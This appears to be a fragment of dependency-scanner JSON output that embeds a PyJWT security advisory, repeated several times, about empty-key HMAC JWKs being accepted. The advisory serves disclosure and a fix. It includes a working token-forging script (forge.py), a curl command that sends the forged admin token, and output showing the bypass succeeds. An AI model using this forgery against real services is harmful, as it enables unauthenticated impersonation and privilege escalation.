              "fullDescription": {
                "markdown": "### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.",
                "text": "### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin endpoint\nHTTP 401\n\n### ATTACK: attacker forges HS256 admin token signed with the EMPTY key\nforged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ\nresponse:\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -\u003e reject\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail\nJWKS now has non-empty k:\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: InvalidSignatureError\"}\n  \u003c-- HTTP 401\n\n### Sanity: a legitimately-signed token with the real secret is accepted\n{\"action\":\"list_all_users\",\"as_user\":\"attacker@evil.example\",\"ok\":true,\"role\":\"admin\"}\n  \u003c-- HTTP 200\n\n### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -\u003e now rejected\nJWKS (empty k, vulnerable config):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n{\"error\":\"invalid token: PyJWKSetError\"}\n  \u003c-- HTTP 401\n```\n\nThe attack returns HTTP 200 with `role:admin` from an unauthenticated forged\ntoken. Both negative controls (wrong non-empty key; real non-empty secret at the\nauth service) return 401, isolating the defect to empty-key acceptance. The\npatched build (the `from_jwk` fix below) rejects the forgery.\n\n### Impact\n\n- Unauthenticated authentication bypass / token forgery: an attacker mints tokens\n  with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,\n  yielding full impersonation and privilege escalation on any endpoint gated by\n  such tokens.\n- Reachable through the documented JWKS verification API\n  (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use.\n- Triggered by the common \"unset signing secret\" misconfiguration that the\n  string-secret path already rejects in 2.13.0, leaving the JWK path as an\n  asymmetric gap.\n\n### Suggested fix\n\nReject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that\n`prepare_key` already applies:\n\n```python\nif obj.get(\"kty\") != \"oct\":\n    raise InvalidKeyError(\"Not an HMAC key\")\n\nkey_bytes = base64url_decode(obj[\"k\"])\nif len(key_bytes) == 0:\n    raise InvalidKeyError(\"HMAC key must not be empty.\")\nreturn key_bytes\n```\n\nThis reuses the exact error message and length check the string/bytes path uses,\nso both HMAC key-loading routes enforce the same invariant. A regression test for\nthe empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.\n\n### Fix PR\n\nhttps://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory\ntemp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`,\nDCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`,\n`test_api_jwk.py`, `test_api_jws.py` pass).\n\n### Credit\n\nReported by tonghuaroot.\n\n\u003e Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [GHSA-pxh4-856f-4h89](https://osv.dev/GHSA-pxh4-856f-4h89)**.\n\n## [GHSA-pxh4-856f-4h89](https://osv.dev/GHSA-pxh4-856f-4h89)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\n\u003e the empty string and returns a zero-length key without raising. When a token is\n\u003e then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n\u003e `PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n\u003e `HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\n\u003e same empty key. The attacker needs no secret knowledge: they reproduce the digest\n\u003e locally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\u003e \n\u003e The empty-key rejection that `HMACAlgorithm.prepare_key` performs for\n\u003e string/bytes secrets (added in 2.13.0) was never propagated to the sibling\n\u003e `from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\n\u003e default decode options this path only emits an `InsecureKeyLengthWarning`, not an\n\u003e error, so verification still succeeds. This is the same \"empty/nil HMAC key is\n\u003e accepted by verify\" defect the JWT ecosystem is currently closing library-side:\n\u003e fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\n\u003e library-side reject-empty-HMAC-key precondition.\n\u003e \n\u003e ### Affected versions\n\u003e \n\u003e `PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n\u003e `7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\n\u003e already guarded in 2.13.0; the JWK/JWKS path is not.\n\u003e \n\u003e ### Privilege required\n\u003e \n\u003e Unauthenticated. Any party who can reach a JWT-verifying endpoint of an\n\u003e application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\n\u003e key has an empty `k` can forge tokens with arbitrary claims.\n\u003e \n\u003e Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\n\u003e entry carries an empty `k`. This occurs when the signing secret is sourced from\n\u003e an unset environment variable / unset config row / key-finder fallback that\n\u003e base64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\n\u003e JWKS containing such an entry. The equivalent unset-secret case for the\n\u003e string-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\n\u003e the JWK route is the remaining reachable surface for the same misconfiguration.\n\u003e \n\u003e ### Vulnerable code\n\u003e \n\u003e `jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\u003e \n\u003e ```python\n\u003e @staticmethod\n\u003e def from_jwk(jwk: str | JWKDict) -\u003e bytes:\n\u003e     try:\n\u003e         if isinstance(jwk, str):\n\u003e             obj: JWKDict = json.loads(jwk)\n\u003e         elif isinstance(jwk, dict):\n\u003e             obj = jwk\n\u003e         else:\n\u003e             raise ValueError\n\u003e     except ValueError:\n\u003e         raise InvalidKeyError(\"Key is not valid JSON\") from None\n\u003e \n\u003e     if obj.get(\"kty\") != \"oct\":\n\u003e         raise InvalidKeyError(\"Not an HMAC key\")\n\u003e \n\u003e     return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n\u003e 